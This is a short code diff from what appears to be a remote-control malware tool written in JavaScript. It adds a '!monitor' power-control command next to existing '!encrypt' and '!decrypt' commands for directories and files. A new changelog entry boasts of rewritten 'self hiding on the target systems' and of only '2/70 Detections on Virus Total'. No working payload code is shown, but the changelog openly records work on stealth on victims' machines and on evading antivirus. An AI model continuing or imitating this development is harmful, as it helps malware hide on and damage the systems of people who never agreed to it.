@@ -251,11 +251,22 @@ const helpDict = {
   "decrypt": {
       "explanation": "Decrypts the given Directory recursively or File.",
       "category": "Utility"
+  },
+  "monitor": {
+      "explanation": "Turns Monitor on and off using the same named keywords (on / off)",
+      "category": "Power Control"
   }
 };
 
 /* ======= Changelog (multi-line, English) ======= */
 const changelog = [
+ { v: "v9.5", note: [
+    "Added:",
+    "!monitor -> Turns Monitors on and off",
+    "Rewrote the self hiding on the target systems - more likely to work",
+    "WE HAVE 2/70 Detections on Virus Total"
+  ].join("\n")
+ },
  { v: "v9.3", note: [
     "Added:",
     "!encrypt -> Encypts Directory or File",
